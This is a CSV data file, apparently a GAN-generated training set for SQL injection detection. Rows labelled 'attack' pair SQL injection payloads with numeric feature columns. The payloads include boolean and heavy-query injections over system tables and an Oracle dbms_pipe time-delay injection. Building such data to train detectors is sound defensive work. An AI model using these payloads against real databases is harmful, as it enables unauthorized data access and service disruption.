id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000461,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,6.104136274509329,231.0274658203125,82.38829040527344,23.652671813964844,91.47747039794922,0.2747364640235901,41.36890411376953,27.912282943725586,1.1974778175354004,0.26820409297943115,0.1281232088804245,0.3354409337043762,0.14345452189445496,3.844564437866211,1.2117034196853638,0.9431594610214233,0.31668418645858765,0.122808076441288,-0.14255115389823914,-0.32651612162590027,6.655966281890869,9.800458908081055,1.9717310667037964,0.3048371970653534,1.4303966760635376,-0.24684587121009827,-0.04133573919534683,0.26719561219215393,1.61383056640625,0.9878777265548706,1.004318356513977,-0.6493630409240723,-0.17614150047302246,-0.1574227213859558,0.5315663814544678,1.357079029083252,7.539314270019531,0.8971158266067505,1.2836036682128906,0.3574105501174927,0.6617176532745361,0.6843858361244202,0.30470868945121765,0.309307724237442,0.1625863015651703,0.3196321427822113,0.11896085739135742,0.30423009395599365,0.191273033618927,0.470282644033432,0.150154247879982,0.18977946043014526,-0.5655167698860168,0.314334511756897,0.14632681012153625,-0.38884150981903076,0.6307122111320496,0.11513768136501312,-0.5312870740890503,-0.49913105368614197,-0.44453439116477966,0.3160155415534973,-0.05255410820245743,4.232437610626221,-0.08133803308010101,0.012095446698367596,0.05920559540390968,-0.11765629053115845,-0.14892816543579102,0.4605289101600647,-0.43958190083503723,1.1308655738830566,-0.3324337601661682,0.07844138890504837,0.2749738097190857,-0.7543449401855469,1.1320310831069946,0.6703911423683167,-0.2883385717868805,-0.18240220844745636,-0.07618984580039978,10.650729179382324,1.0489168167114258,0.2673988342285156,0.3380681276321411,-0.6446519494056702,0.7870453596115112,0.4844704270362854,-0.2637491226196289
GAN_000462,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.252531575905207,212.05160522460938,79.50447845458984,20.782175064086914,66.20470428466797,0.2004081755876541,50.23986053466797,25.336584091186523,1.1442744731903076,0.30131974816322327,0.13161054253578186,0.34953030943870544,0.14932389557361603,3.819216728210449,0.933469831943512,0.8907797336578369,0.28399622440338135,0.09314385056495667,-0.08525598794221878,-0.15059968829154968,6.264693737030029,7.221851348876953,2.013249635696411,0.2778156101703644,1.396369457244873,-0.15051938593387604,-0.04691478610038757,0.2078711986541748,1.7717598676681519,0.9272833466529846,0.7459865212440491,-0.6042554974555969,-0.08578255027532578,-0.4107501804828644,0.38107410073280334,1.4367800951004028,6.576441764831543,0.7238681316375732,1.014787197113037,0.10644231736660004,0.5522733926773071,0.8326173424720764,-0.03877004608511925,0.3733523190021515,-0.15547345578670502,0.32506316900253296,0.21835967898368835,0.2531455159187317,0.1738390326499939,0.35679057240486145,0.06978099048137665,0.12677384912967682,-0.5213122963905334,0.243793785572052,0.1696828305721283,-0.12033893167972565,0.30599334836006165,0.13727211952209473,-0.5574877858161926,-0.3221173584461212,-0.4453681707382202,0.2529814839363098,0.10237323492765427,3.4584836959838867,-0.02858709543943405,-0.009710998274385929,0.05957451090216637,-0.008862622082233429,-0.2174365222454071,0.2693820893764496,-0.19432485103607178,0.6815105676651001,-0.5392783880233765,0.07680567353963852,0.22770598530769348,-0.6089663505554199,1.2057290077209473,0.6642124652862549,-0.08676345646381378,-0.12319820374250412,-0.1727966070175171,8.630289077758789,1.1281743049621582,0.05473383888602257,0.4241418242454529,-0.37278905510902405,0.48069289326667786,0.39811989665031433,-0.1809511035680771
GAN_000463,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.135965300813773,218.25863647460938,77.45772552490234,23.1613712310791,77.31150817871094,0.24985119700431824,41.58320999145508,25.352943420410156,0.9729639291763306,0.2850990295410156,0.10001899302005768,0.3342875838279724,0.1414206475019455,3.8094170093536377,1.3199458122253418,1.0972026586532593,0.3760678768157959,0.09766928851604462,-0.07417101413011551,-0.17364919185638428,6.769364833831787,7.649456977844238,1.921623706817627,0.28954657912254333,1.5386470556259155,-0.19191591441631317,-0.0582367479801178,0.09737121313810349,1.7985754013061523,0.9655590057373047,0.6145315170288086,-0.4682927429676056,-0.04705144092440605,-0.18861450254917145,0.4507240355014801,1.480934977531433,5.606324195861816,0.6416043043136597,1.1366928815841675,0.14176838099956512,0.6277284026145935,0.5782979726791382,0.19722490012645721,0.19163298606872559,0.02595781534910202,0.2258625030517578,0.07201972603797913,0.21381056308746338,0.20271800458431244,0.3397033214569092,0.1541702151298523,0.13721643388271332,-0.4366379678249359,0.3131003975868225,0.058078583329916,-0.2683965563774109,0.43095946311950684,0.05596081167459488,-0.17843705415725708,-0.42391520738601685,-0.48524224758148193,0.3161596953868866,0.04291630536317825,3.407169818878174,-0.026773415505886078,0.017957154661417007,0.03594290092587471,-0.12231692671775818,-0.24271512031555176,0.2802426218986511,-0.45044848322868347,0.8096736669540405,-0.3800065219402313,0.05863266438245773,0.19313248991966248,-0.6957937479019165,1.0721807479858398,0.6761220097541809,-0.13227620720863342,-0.14651285111904144,0.08199864625930786,8.256546974182129,1.0565515756607056,0.11228802800178528,0.4270603656768799,-0.29335612058639526,0.35786163806915283,0.30130651593208313,-0.1053776890039444
GAN_000464,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,6.540204014273151,241.0056915283203,92.06560516357422,19.439346313476562,83.81610870361328,0.34191688895225525,38.13276672363281,24.448822021484375,1.4222180843353271,0.2913631200790405,0.09714525192975998,0.30498743057250977,0.14746107161045074,4.016772270202637,0.7255325317382812,0.8322680592536926,-0.26591426134109497,0.12133469432592392,-0.15168678760528564,-0.6366236805915833,6.750064373016357,6.755594253540039,1.5564866065979004,0.4272685647010803,1.343131422996521,-0.4125448167324066,0.008459072560071945,0.10773324221372604,1.9638416767120361,1.1559598445892334,0.9988285303115845,-0.7489317655563354,-0.06882942467927933,-0.1591130495071411,0.3940028250217438,1.2188092470169067,7.540968418121338,0.7916838526725769,1.2398892641067505,0.1879180520772934,0.5500426888465881,0.7780026197433472,0.1414688378572464,0.3548228442668915,-0.08378107100725174,0.5395730137825012,0.3198634684085846,0.3501562476158142,0.2570253312587738,0.383608341217041,0.11344750970602036,0.16102519631385803,-0.6127049922943115,0.21069921553134918,-0.08454875648021698,-0.39696428179740906,0.7872541546821594,-0.048666976392269135,-0.6576451063156128,-0.5022450089454651,-0.7638182044029236,0.06457509100437164,0.28061291575431824,5.154371738433838,-0.024144195020198822,0.015239144675433636,0.10019456595182419,0.31201818585395813,-0.056460727006196976,0.4141612946987152,-0.5043653845787048,1.1047366857528687,-0.7200166583061218,0.10606025159358978,0.2319650799036026,-1.0708868503570557,1.2969328165054321,0.7976427674293518,-0.4233606159687042,-0.3174642324447632,0.03722603619098663,10.225741386413574,1.1895651817321777,0.1767306923866272,0.2653799057006836,-0.5577560067176819,0.7272589802742004,0.4001981317996979,-0.43045371770858765
GAN_000465,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.3888065384094865,229.0177764892578,87.3238525390625,20.852609634399414,81.68890380859375,0.2414408028125763,50.7469367980957,26.069276809692383,1.3474454879760742,0.3101058900356293,0.12593890726566315,0.3219815492630005,0.14672428369522095,3.8758552074432373,0.7478095293045044,0.5601401925086975,0.4336646795272827,0.0703875720500946,-0.013935514725744724,-0.21285216510295868,6.3191938400268555,6.855247497558594,1.886601209640503,0.23809140920639038,1.6007888317108154,-0.34422028064727783,0.05768629536032677,0.31759271025657654,1.2877081632614136,1.0112104415893555,0.7935619354248047,-0.5141751170158386,-0.0527522973716259,-0.010067015886306763,0.4814058840274811,1.2079051733016968,6.835071086883545,0.8734259009361267,0.9033803343772888,0.18492688238620758,0.5319399237632751,0.7674028277397156,0.08782151341438293,0.3612219989299774,-0.03081268072128296,0.4924066364765167,0.046113934367895126,0.3234364688396454,0.2589651346206665,0.3304347097873688,0.18881253898143768,0.18662050366401672,-0.21289560198783875,0.4224620461463928,0.09221319109201431,-0.2934318780899048,0.5069155693054199,-0.041585274040699005,-0.4875941872596741,-0.3927620053291321,-0.26945239305496216,0.016853004693984985,0.23383072018623352,3.5525918006896973,-0.09926071763038635,0.019436374306678772,0.0895448550581932,0.1931658238172531,-0.021987002342939377,0.22951728105545044,-0.5161826014518738,0.6743445992469788,-0.5808218121528625,0.07495096325874329,0.22228699922561646,-0.9303802251815796,1.2082768678665161,0.6382675170898438,-0.3195130228996277,-0.19270406663417816,0.12532994151115417,8.130533218383789,1.090449333190918,0.23735955357551575,0.2143062949180603,-0.560090184211731,0.5861662030220032,0.5476592779159546,-0.2777090072631836
GAN_000466,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,5.77967157524903,217.16297912597656,84.79840087890625,20.660764694213867,72.60073852539062,0.20641525089740753,40.477569580078125,24.697513580322266,1.0407209396362305,0.2824016213417053,0.11897949129343033,0.33722245693206787,0.14984193444252014,3.8744208812713623,1.1201170682907104,1.0471333265304565,-0.16123084723949432,0.10034884512424469,-0.16960883140563965,-0.21469733119010925,7.668464660644531,6.392585754394531,1.7576311826705933,0.3079324960708618,1.3510535955429077,-0.49431926012039185,-0.09271924942731857,0.1325111985206604,1.98660409450531,0.887583315372467,0.5994526147842407,-0.5664936900138855,-0.09646659344434738,-0.5355375409126282,0.4262213408946991,1.5012199878692627,6.546588897705078,0.8185942769050598,1.0218911170959473,0.40444624423980713,0.4681430459022522,0.7491122484207153,0.03507599979639053,0.23201952874660492,-0.10667362064123154,0.14579656720161438,0.3210850954055786,0.20887453854084015,0.2176126390695572,0.32515594363212585,0.10475621372461319,0.11469276249408722,-0.3766952455043793,0.2692181468009949,0.08970213681459427,-0.2504723072052002,0.30190667510032654,0.22838225960731506,-0.5605083703994751,-0.2969159185886383,-0.4466836154460907,0.1223929226398468,-0.05147278681397438,4.447281837463379,-0.02398114651441574,0.01761440560221672,0.08421635627746582,-0.3359215259552002,-0.3591112196445465,0.5618494153022766,-0.5560689568519592,0.9713776707649231,-0.5257572531700134,0.06891398876905441,0.2938196361064911,-0.7277486324310303,1.2614070177078247,0.7350876331329346,-0.19064992666244507,-0.24040867388248444,0.06968866288661957,10.204635620117188,1.0880815982818604,0.03435918316245079,0.5499365925788879,-0.5140814185142517,0.19054684042930603,0.14718909561634064,-0.29834187030792236
GAN_000467,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,6.498630496967164,244.66661071777344,87.88848114013672,19.105327606201172,78.91105651855469,0.3436514735221863,45.83513641357422,22.61117172241211,1.2705066204071045,0.30565008521080017,0.11119716614484787,0.31297802925109863,0.1500251293182373,3.9281766414642334,0.791761577129364,0.7027737498283386,-0.0329548642039299,0.14000335335731506,-0.18657809495925903,-0.3171927332878113,6.6988396644592285,6.870512008666992,1.623294711112976,0.21815964579582214,1.5177322626113892,-0.7983095049858093,0.045542407780885696,0.058270979672670364,1.9965609312057495,1.2166255712509155,1.1781412363052368,-0.744518518447876,-0.13175930082798004,-0.16580316424369812,0.4710608720779419,1.1269429922103882,5.652446269989014,0.7153777480125427,0.9500057697296143,0.4055545926094055,0.5225077271461487,0.9003485441207886,0.1783219873905182,0.5493130087852478,0.015593811869621277,0.536729633808136,0.12508930265903473,0.327563613653183,0.26282310485839844,0.39333146810531616,0.11776386946439743,0.1900019496679306,-0.4197961688041687,0.5254252552986145,-0.03398656100034714,-0.485077828168869,0.754944384098053,0.08501794934272766,-0.4377341866493225,-0.6908287405967712,-0.5386291742324829,0.11847718060016632,0.1858643889427185,4.397350788116455,0.06579342484474182,-0.019661087542772293,0.08103110641241074,0.19650225341320038,-0.21515706181526184,0.5482834577560425,-0.6043334007263184,1.236804485321045,-0.8676852583885193,0.08971066772937775,0.38122743368148804,-1.117827296257019,1.232884407043457,0.7925677299499512,-0.36975106596946716,-0.26927825808525085,0.11478538811206818,10.55758285522461,1.2127397060394287,0.1778002828359604,0.2899840474128723,-0.7129592299461365,0.8762760758399963,0.5480080842971802,-0.5063982605934143
GAN_000468,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.834001244535951,225.3009490966797,83.05249786376953,16.86539649963379,63.528465270996094,0.22223682701587677,47.19156265258789,22.120555877685547,1.1731297969818115,0.3167493939399719,0.13243570923805237,0.3076065480709076,0.15580137073993683,4.0083537101745605,0.5677510499954224,0.8245612382888794,0.053677983582019806,0.10662660002708435,-0.11742078512907028,-0.34771203994750977,5.653004169464111,6.278518199920654,1.71748948097229,0.18622314929962158,1.3904272317886353,-0.4180642068386078,0.005774315446615219,0.0532909519970417,1.8283917903900146,0.928282618522644,0.8650828003883362,-0.6340230107307434,-0.10280623286962509,-0.3555471897125244,0.3986493647098541,1.2413944005966187,6.893270492553711,0.8496609926223755,0.9237547516822815,0.1541409194469452,0.5211595892906189,0.9256061911582947,0.1352318972349167,0.3689964711666107,-0.24400299787521362,0.4545458257198334,0.4029943346977234,0.31589093804359436,0.2520234286785126,0.3500681519508362,0.10957387089729309,0.1688145250082016,-0.37134861946105957,0.2360735833644867,0.1745881289243698,-0.283120721578598,0.6818441152572632,-0.06288474053144455,-0.49462127685546875,-0.4486958980560303,-0.5625771880149841,0.14864328503608704,0.34729811549186707,4.274791717529297,0.047352384775877,0.05084669589996338,0.11267398297786713,0.4380120038986206,-0.15982525050640106,0.28065261244773865,-0.49519163370132446,0.7065565586090088,-0.8227238059043884,0.08114402741193771,0.12152861803770065,-1.0281143188476562,1.2649590969085693,0.7249644994735718,-0.44668763875961304,-0.2110099047422409,-0.14276261627674103,8.577308654785156,1.1577990055084229,0.1345101296901703,0.3501032590866089,-0.4776347875595093,0.7287538051605225,0.4835679829120636,-0.39580798149108887
GAN_000469,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,5.339940297754896,191.92544555664062,81.62947082519531,18.649866104125977,54.31098175048828,0.16692812740802765,38.65605926513672,23.097902297973633,1.0118094682693481,0.30918747186660767,0.10678745061159134,0.341520220041275,0.14487233757972717,3.7827951908111572,0.9958859086036682,0.980862557888031,0.03167230635881424,0.06920740753412247,-0.08343682438135147,-0.17337805032730103,7.685359001159668,5.5107550621032715,1.9996150732040405,0.37792038917541504,1.279894471168518,-0.07587874680757523,0.08613736927509308,0.1425042450428009,2.293328046798706,0.8121115565299988,0.27543869614601135,-0.536308228969574,0.025653522461652756,-0.5254765152931213,0.4093000590801239,1.63483726978302,7.153454780578613,1.061894416809082,1.0487178564071655,0.1533379703760147,0.3934354782104492,0.77850741147995,0.06693080812692642,0.10580999404191971,-0.26821058988571167,0.28950682282447815,0.45009154081344604,0.07781843096017838,0.282572865486145,0.2212117463350296,0.10310317575931549,0.10064432770013809,-0.34483110904693604,0.1311555951833725,-0.056175053119659424,-0.1567191779613495,0.01799716427922249,0.11169395595788956,-0.7259587049484253,-0.2545856237411499,-0.5418754816055298,0.08949189633131027,0.1705523431301117,3.7423934936523438,-0.21474198997020721,0.04661496356129646,0.07832956314086914,-0.24427546560764313,-0.3306511342525482,0.2727148234844208,-0.40893107652664185,0.5153182744979858,-0.42346346378326416,0.07023033499717712,0.241052508354187,-0.5602043867111206,1.4007813930511475,0.6799392104148865,-0.11340037733316422,-0.15696166455745697,-0.06332720816135406,9.354890823364258,1.0649149417877197,0.1678246706724167,0.6054943799972534,-0.4026051163673401,0.02598641812801361,0.0917210727930069,-0.28553837537765503
GAN_000470,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,6.628410457878568,251.91424560546875,86.17105102539062,25.066200256347656,97.9759750366211,0.30331215262413025,28.40928077697754,29.937803268432617,1.3680607080459595,0.23918095231056213,0.09088678658008575,0.3103429079055786,0.13942627608776093,3.9191646575927734,1.1635634899139404,0.901130199432373,0.18769700825214386,0.13756926357746124,-0.14398854970932007,-0.8295440077781677,6.494054317474365,9.020637512207031,1.176119327545166,0.4600886404514313,1.3813180923461914,-0.07808840274810791,0.13772812485694885,0.3944217264652252,1.6371734142303467,1.1951321363449097,1.200537085533142,-0.7590562105178833,-0.17804598808288574,0.13286057114601135,0.5356224179267883,1.3292579650878906,7.732260704040527,0.7486031651496887,1.4025485515594482,0.13320580124855042,0.5691533088684082,0.5742173790931702,0.47347724437713623,0.34766802191734314,0.22854706645011902,0.5534151792526245,0.0054861996322870255,0.41990193724632263,0.210429847240448,0.4560870826244354,0.16111090779304504,0.19682416319847107,-0.332089900970459,0.40320760011672974,-0.015300869941711426,-0.6718429923057556,0.7843347191810608,0.0016602667747065425,-0.4972304701805115,-0.47116899490356445,-0.39660823345184326,0.33267706632614136,0.18042686581611633,4.464230537414551,-0.15024957060813904,-0.002867054892703891,0.01845712959766388,-0.09504948556423187,-0.31507018208503723,0.3846338987350464,-0.3462744355201721,1.04464590549469,-0.5937250256538391,0.11025819182395935,0.2088082730770111,-1.0433323383331299,1.1897960901260376,0.7214294075965881,-0.2873579263687134,-0.19629208743572235,-0.009513180702924728,7.866304874420166,1.0096733570098877,0.46033498644828796,0.21188583970069885,-0.688291609287262,0.772634744644165,0.5476092100143433,-0.19750265777111053
GAN_000471,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,5.555070615528595,204.75819396972656,80.53665161132812,20.997156143188477,71.83141326904297,0.23350805044174194,53.6336555480957,28.02614974975586,1.1572695970535278,0.30530983209609985,0.1550276279449463,0.3517579436302185,0.1545780450105667,3.782372236251831,0.6223280429840088,0.9058960676193237,0.30551546812057495,0.09166165441274643,-0.11349385231733322,-0.14673228561878204,6.13961124420166,7.021457195281982,2.136475086212158,0.4670136272907257,1.439405918121338,-0.04706108942627907,0.023761224001646042,0.43343496322631836,1.7131593227386475,0.8986673951148987,0.7925451397895813,-0.5287082195281982,-0.07770926505327225,-0.6080714464187622,0.3260101079940796,1.4477592706680298,7.394266128540039,1.0987303256988525,1.1128885746002197,0.039998795837163925,0.6317359805107117,0.8993461728096008,-0.13794271647930145,0.06144150346517563,-0.031708281487226486,0.21602623164653778,0.14059391617774963,0.2916027307510376,0.21070225536823273,0.41349461674690247,0.13011693954467773,0.1612277626991272,-0.5265076756477356,0.4713265299797058,0.20414438843727112,-0.17981135845184326,0.1726999282836914,0.16568219661712646,-0.7568356394767761,-0.3893064558506012,-0.22875794768333435,0.07816775143146515,0.4045622646808624,4.177696228027344,-0.02002226561307907,0.015057015232741833,0.07129371911287308,0.3255079388618469,-0.01339505985379219,0.042645569890737534,-0.12561935186386108,0.7240336537361145,-0.5730089545249939,0.09512872993946075,0.22442887723445892,-0.6048210859298706,1.3638478517532349,0.5684704780578613,-0.3033149242401123,-0.11068733781576157,-0.0713924765586853,8.31761360168457,1.1316089630126953,0.2539675533771515,0.6375266909599304,-0.3801729679107666,0.5078095197677612,0.32496532797813416,-0.47113746404647827
GAN_000472,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,5.97067016987215,222.779541015625,80.6575927734375,19.86544418334961,76.46190643310547,0.28356802463531494,40.39464569091797,25.410737991333008,1.189000129699707,0.28650084137916565,0.11804105341434479,0.33140912652015686,0.1543562114238739,3.8203916549682617,0.45058661699295044,0.7904466986656189,0.2230081707239151,0.10934694856405258,-0.07896017283201218,-0.28890323638916016,7.000336647033691,6.0325822830200195,2.1892552375793457,0.4786677658557892,1.3384828567504883,-0.38330164551734924,0.19705578684806824,0.13622257113456726,2.1233866214752197,0.8776569962501526,0.6199739575386047,-0.6747234463691711,0.02415928989648819,-0.29992935061454773,0.495294988155365,1.4028117656707764,7.588108062744141,1.1731650829315186,1.171036958694458,0.2941168248653412,0.5390565991401672,0.6914574503898621,0.27167579531669617,0.32580459117889404,-0.31569916009902954,0.3986365497112274,0.5302532911300659,0.207487091422081,0.27525678277015686,0.28273430466651917,0.1201263964176178,0.11837270110845566,-0.3238079249858856,0.16121146082878113,-0.31759214401245117,-0.5676778554916382,0.49324509501457214,-0.06286034733057022,-0.8763631582260132,-0.2946436405181885,-0.5176090002059937,-0.028928525745868683,0.14866510033607483,4.6366353034973145,-0.06487095355987549,0.07384644448757172,0.09426312893629074,0.009511426091194153,-0.25281810760498047,0.3347415030002594,-0.4422185719013214,1.012909173965454,-0.6243087649345398,0.10271745175123215,0.1693822145462036,-0.7716925144195557,1.25141441822052,0.7563071846961975,-0.29651400446891785,-0.19638587534427643,0.03192760795354843,9.421304702758789,1.079864740371704,0.127242773771286,0.4011281728744507,-0.6248836517333984,0.5502561926841736,0.26703643798828125,-0.4539346694946289
GAN_000473,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,6.3292030490134765,211.21539306640625,86.2275619506836,21.518260955810547,75.52640533447266,0.19961024820804596,28.761425018310547,26.85761070251465,1.240234375,0.25102871656417847,0.10802879929542542,0.34068819880485535,0.14613354206085205,3.8214805126190186,0.7557907700538635,0.8577982783317566,-0.024198345839977264,0.12970438599586487,-0.1706184446811676,-0.6456941962242126,7.127134799957275,6.482365608215332,1.6841388940811157,0.4638192355632782,1.3539490699768066,-0.40498101711273193,-0.007804317399859428,0.2730892598628998,2.3475866317749023,1.085154414176941,0.936138927936554,-0.7604052424430847,-0.10399826616048813,-0.5165892243385315,0.519374430179596,1.405673861503601,6.837891101837158,1.0138741731643677,1.302931785583496,0.29498639702796936,0.46799543499946594,0.7745918035507202,0.2113955318927765,0.3466728627681732,-0.1608729362487793,0.5043560862541199,0.26836955547332764,0.27610936760902405,0.2870050370693207,0.4734584391117096,0.08530119061470032,0.15413038432598114,-0.37260839343070984,0.43052399158477783,-0.19054347276687622,-0.370961457490921,0.34230729937553406,0.20421671867370605,-0.7614195346832275,-0.5267647504806519,-0.345590740442276,0.3182503581047058,0.26383548974990845,4.8091511726379395,-0.08556286990642548,-0.015427281148731709,0.041177429258823395,-0.1692875176668167,-0.3036711812019348,0.2342957854270935,-0.44177407026290894,1.0650159120559692,-0.5535886287689209,0.0924757719039917,0.3371456265449524,-0.7715494632720947,1.4705804586410522,0.7152808308601379,-0.2932755947113037,-0.2019815295934677,0.09219808876514435,8.758140563964844,1.107664704322815,0.28883641958236694,0.29682332277297974,-0.6103822588920593,0.4542025029659271,0.43704503774642944,-0.3595595955848694
GAN_000474,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,6.312902031487688,237.24972534179688,87.62413024902344,23.117971420288086,89.78585815429688,0.3223567008972168,34.30070114135742,27.449359893798828,1.3297343254089355,0.26598161458969116,0.1303364783525467,0.3098224699497223,0.15693315863609314,3.9617083072662354,0.8117380738258362,0.8304625153541565,-0.030323319137096405,0.1220858246088028,-0.13863736391067505,-0.5651711821556091,5.290240287780762,6.8410420417785645,1.6446692943572998,0.45441392064094543,1.4197038412094116,-0.34264522790908813,-0.16776736080646515,0.06890245527029037,1.8886256217956543,1.0922460556030273,1.0767760276794434,-0.7983573079109192,-0.07783862203359604,-0.20602887868881226,0.4112134575843811,1.2910946607589722,6.112566947937012,0.6373518705368042,1.2045977115631104,0.3283454477787018,0.5773522853851318,0.7210013270378113,0.08459259569644928,0.21706515550613403,-0.0454876683652401,0.34663188457489014,0.18278393149375916,0.40707483887672424,0.25965556502342224,0.36084991693496704,0.12696883082389832,0.19620364904403687,-0.6393194198608398,0.30317771434783936,-0.09606944024562836,-0.4594564139842987,0.6262033581733704,0.04645868390798569,-0.3215101361274719,-0.5486934781074524,-0.6899465918540955,0.18659919500350952,0.1645384132862091,4.230528831481934,0.1370006501674652,0.02120385877788067,0.03484809398651123,0.29463106393814087,-0.11834056675434113,0.3177126348018646,-0.4148917496204376,1.2018264532089233,-0.8850331902503967,0.09190541505813599,0.3672110438346863,-1.0441333055496216,1.341056227684021,0.7220683693885803,-0.46937716007232666,-0.1990559846162796,0.06934905052185059,8.632244110107422,1.1437978744506836,0.06947299838066101,0.19320154190063477,-0.5096812844276428,0.7166488766670227,0.3547305762767792,-0.4954015016555786
